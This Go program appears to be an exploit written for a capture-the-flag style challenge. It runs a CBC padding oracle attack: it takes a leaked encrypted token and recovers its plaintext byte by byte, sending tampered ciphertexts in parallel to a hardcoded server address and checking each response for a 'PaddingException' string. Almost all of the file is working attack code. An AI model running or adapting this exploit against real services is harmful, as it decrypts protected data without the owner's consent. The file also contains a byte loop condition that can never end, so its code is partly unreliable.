package main

import (
	"context"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
)

var (
	decReplacer *strings.Replacer
	encReplacer *strings.Replacer
	client      *http.Client
	ctx         context.Context
	result      []byte
)

const (
	blockLen    = 16
	url         = "http://35.227.24.107/91c6c6e269/?post=%s"
	errorString = "PaddingException"
	parallel    = 5
)

func init() {
	decReplacer = strings.NewReplacer("~", "=", "!", "/", "-", "+")
	encReplacer = strings.NewReplacer("=", "~", "/", "!", "+", "-")

	client =
		&http.Client{
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}

}

func decode(s string) []byte {
	b64 := decReplacer.Replace(s)
	data, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		log.Fatal(err)
	}
	return data
}

func encode(data []byte) string {
	b64 := base64.StdEncoding.EncodeToString(data)
	return encReplacer.Replace(b64)
}

var payload = "5GTIS9tKmttdwngAIFfOvAfFsdYJKeExI!CTLao1u9DZH!zEuY1yYmnN7aV9WgPEsz9xEKUEVLbYNZTONgpHwxsYrKo-48KXSCUxuE67Sp1-8U9SMIeKBahBggxMpWPAbm2pCRPhqZFx9SgW7bTu-UceZ6sa9BtUTd3GgxYgw!47BKrfQl8p4-Xv4cynpOxbEcW0DqXicoNqwH!VzFD6lQ~~"

func main() {
	var plaintext string

	// start with proper payload, which is typically leaked from server
	cipher := decode(payload)
	if len(cipher)%blockLen != 0 {
		log.Fatal("cipher len % 16 != 0")
	}

	// get total number of blocks in cipher
	blockCount := len(cipher) / blockLen

	// we really only need to send 2 blocks of ciphertext
	// first is one we gonna tamper
	// second, is where padding error will be produced
	// this way, we move backwards towards the beggining of the whole payload
	// the very last first block is IV

	// loop for every discovered block
	for blockOffset := 0; blockOffset < blockCount-1; blockOffset++ {
		// loop for every byte position inside the discovered block
		ciphertext := cipher[blockOffset*blockLen : (blockOffset+2)*blockLen]

		plaintext += string(revealBlock(ciphertext))
	}

	fmt.Println(plaintext)

}

// reveals a single block of plaintext
// requires cipher input of blockLen*2
func revealBlock(ciphertext []byte) []byte {
	block := make([]byte, blockLen)

	// loop through every byte to tamper, go backwards
	for pos := blockLen - 1; pos >= 0; pos-- {
		// reveal the byte
		block[pos] = revealByte(ciphertext, pos)

		// adjust padding for the next shot
		for i := pos; i < blockLen; i++ {
			padVal := byte(blockLen - pos)
			ciphertext[i] ^= padVal ^ (padVal + 1)
		}
	}

	return block
}

// reveals a single byte of plaintext
// requires cipher input of blockLen*2 and a position (0-blockLen)
func revealByte(ciphertext []byte, pos int) byte {
	validCipherByte := ciphertext[pos]
	ctx, _ := context.WithCancel(context.Background())

	c := make(chan byte)
	done := make(chan bool, 256)
	para := make(chan byte, parallel)

	// try every possible byte value
	for i := byte(0xff); i >= 0; i-- {
		para <- 0
		go func(i byte) {
			// this copy is crucial to make all this parallel shit thread-safe
			cipherCopy := make([]byte, len(ciphertext))
			copy(cipherCopy, ciphertext)

			// play with byte at a given position
			cipherCopy[pos] = i

			// send the payload and check for padding error
			if !testRequest(ctx, cipherCopy) {
				// send found byte into channel
				c <- i ^ (blockLen - byte(pos)) ^ validCipherByte
			} else {
				// send that we tried...
				fmt.Println(i)
				done <- true
			}
			_ = <-para
		}(i)
	}

	doneCnt := 0
	var (
		result byte
		failed bool
	)

loop:
	for {
		select {
		case result = <-c:
			break loop
		case <-done:
			doneCnt++
			if doneCnt == 256 {
				// failed to found the proper value, abort stuff
				failed = true
				break loop

			}
		default:
			continue
		}
	}

	//cancel()

	if failed {
		log.Fatal("failed to reveal byte")
		return 0
	}

	// reveal the byte
	return result
}

func testRequest(ctx context.Context, data []byte) bool {
	// encode payload for URL transferring
	payload := encode(data)

	// send request with retries
	req, err := http.NewRequestWithContext(ctx, "GET", fmt.Sprintf(url, payload), nil)
	if err != nil {
		log.Fatal(err)
	}

	// process the response
	resp, err := client.Do(req)
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

	fmt.Print(".")

	// determine padding error
	return strings.Contains(string(body), errorString)
}
